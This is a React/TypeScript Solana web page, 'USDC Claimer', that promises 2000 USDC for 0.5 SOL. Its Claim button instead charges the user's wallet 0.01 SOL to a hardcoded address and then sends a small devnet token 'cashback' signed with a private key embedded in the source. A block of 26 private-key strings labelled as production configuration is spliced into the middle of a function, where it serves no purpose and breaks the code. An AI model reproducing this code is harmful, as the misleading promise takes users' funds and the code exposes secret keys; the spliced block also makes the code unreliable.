/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4yRRJrzkSXERUupq4BvyGDtEzmvZokSXRX6khhDEjv7zZjGrRPJay3h5EoTjwvF697igZeXZ4Xx45bGtYXBCokUH"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "xHZUkWyGCkSTeFFuD9Dm45rLUXv7j8nx475cD7fb28q66Q6agpxSYaaezwTVjMrVAAPA4MmrFDCJoHudtd71FWc",
  "key1": "3wbjsSaHHCQwLzPXdyUa6vh1XX2tDoj76XbBauHKQKCcKZoAJHnhJs5U7x15ka6BTKj8bzHxWdu67FUxubJDmMSg",
  "key2": "3aCSng6VVWGpifUpXmWS5mN5i49ogB6EPdVfjzGb5LD3UbP6nQY5o89r7Cwjbfd3sr3T4zrmrZjKR4hFD1VgbhPP",
  "key3": "476DJpjejAPHKEiX4QYG7fzhdjqZNMDS6Syw96Qxee9VEH4SzxntRojwq7pwnuZGcLUneNmaHAQsDyLNJjy1ku6s",
  "key4": "3GW7wvoSzHkkZMxdjvP2VimH3XsDtQVAEdSVqN4tD7MiEB6MxE8rKSyZiVeDcZptKZR75acbViiHfT8SDpCg261T",
  "key5": "4pKSKhze54hv7b268u3V3QCSHvuYn2YJoyNFu6BYuysHMa3furrrrvBPACWY5bibESyzsjK74pgiBmyPGgkmDMKg",
  "key6": "22ST2LntnYGJrVxLnbEW5vvtjoAVDPZZt3F5WF4vGL7czgHqyf2pXNrz2DGsJ93a1sUpcuraXMyNkLwc6xXG28nJ",
  "key7": "55aMPcQtwNGP6UasrTP6ccRTe5xqDumqpJjCvdAaRmfqDvqZsCfNdcVS6P9AyYpmSXDt6i8HvtbQiu5J3RXThDXM",
  "key8": "TeEw3fxUS7Ar99D5JfmpmAQ4Cw1jgfZcB8nNQYRtybkrrAj3Q5jg3AqhyGLNTgko2M6USoYjtHmTbaUNvRJRrkc",
  "key9": "2iSHFu8e1u4xTSrQhfat1Vcf7kf3gkCYnUQDtMLtGoGTR8bfk9sq5E2vBqxskdCC6s8VAeqyEhbswUpXtbaybzv",
  "key10": "5JXDTzVjZsgmTL68pcbuxAte1KSejcGM6CHdUjx4tFXvkWgQKWPR57146EqSQofMjNzffSJg9kT6hJdqSjPRr6sb",
  "key11": "gSohvvLCc6KvrjfptfUaBLeksJ5yHHbWVKnzsFTXqHhKqxgDp4m8Bg13STvEwLaBwYR1n9q4Y1h4g2nLLmERZeq",
  "key12": "3LRisfnegkopjx5MYTv7XHtfpifBDnQeLvozAjdPy4mRgrGoaEp3BY1xHZ5T1EHkhPoa3abdHJS6tcsjArmG6jQ6",
  "key13": "3uXpQUdqmRmYH2JbQhgYVc8Ju62YKesoQVmHcGDM93vF8G7SqxxGjc3huNgHHzKHd4MBUSxMqr7qUXzpiMjZu3KZ",
  "key14": "4tsCbwR8JMnRDKZV4s5nXyaJGXnvucoujCws3DnuJyWSvGECoFFAJwJz35t8RTomMizwKK6DGPDXtCkGDkuErrxb",
  "key15": "4RPSjxjKKyPdcmY2jVxb8Gt9hPXpXnaeQaYSsnYvLDdmXPMbvGVdFm9BtQv6fND75vejckrfdnHYHfw16JKmCTrs",
  "key16": "38FrnmokN9A7nYF62AFxbsTmbywqPTXwR7ZxGhCtS8zXqsiirDq52M4Ez2LErnFbFK3EXmWX2iDoL86FyD8YyVH1",
  "key17": "3hidW3Rej5uB1LwV2rdruMxBQPmdLXumcqZcLVGmZd3HbWowo8bto3TQbufe7MJqrHt7R3LvPSbqbDxY9KDHhKej",
  "key18": "M9MzNGxEFNjP5VWNyAyfoCvPkUyFHVheAKLALMifTQSCFKHZ245JnqgNatbfoZMaJuZCeypjyNF5iTp3VtgHwG8",
  "key19": "5d1KgmPN4dTuJUxFbGSnnp5iJQdnFHVEKMUxr8A7JTMaRSuodmXPAGyqaDGua8jwjpMY4ghrvG1v3SqqMNVWCuec",
  "key20": "2nQ4VqYXcjrSbKf9ctzURmFckj7dhWkrMVJsrRWpvZ7232CP1wu56veZX3pdKVVenzjZ4Cs2AV4LZ9uRizrqBC7Z",
  "key21": "3vuwMkoGgWkRLHoJgtfTaVLML62LsCHS9G8UXgtznctwp8DDdcvrBj97Gm6a1igtfb6Ga5bbiDi4YZMv4Uy79JTe",
  "key22": "57ibxVy3v5FFfKrxtFxy5nANEsfwDTdgFBMkNjbbr29wHmc3jv2syN6cYe4LesPhWYajEUv3Y7hk9VrJ1skwvw7m",
  "key23": "2TQ2WqpJrAtXjwc83PSw2AhvnRyKUMQrnygfThvJ6DFCEr3gy6KdNw2wQkWML7A4wiJLGaaN1VFAczzjc11UN8r2",
  "key24": "3vTG6agF5DnM1PT9rag3GAPDUEXyfCiHhdorVFmd8yxXf1himUNu1EJCt1oqb3s9vrypKoZRtr6uNHFfNuquzd2g",
  "key25": "5mGzDCScV5JreoQKAypku7vMGA8wruXLFdk6idaxWgMomixtpMnGPtpAAJhHMe3ZVGSbGVY9vdPhLB2t9ABdthMo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
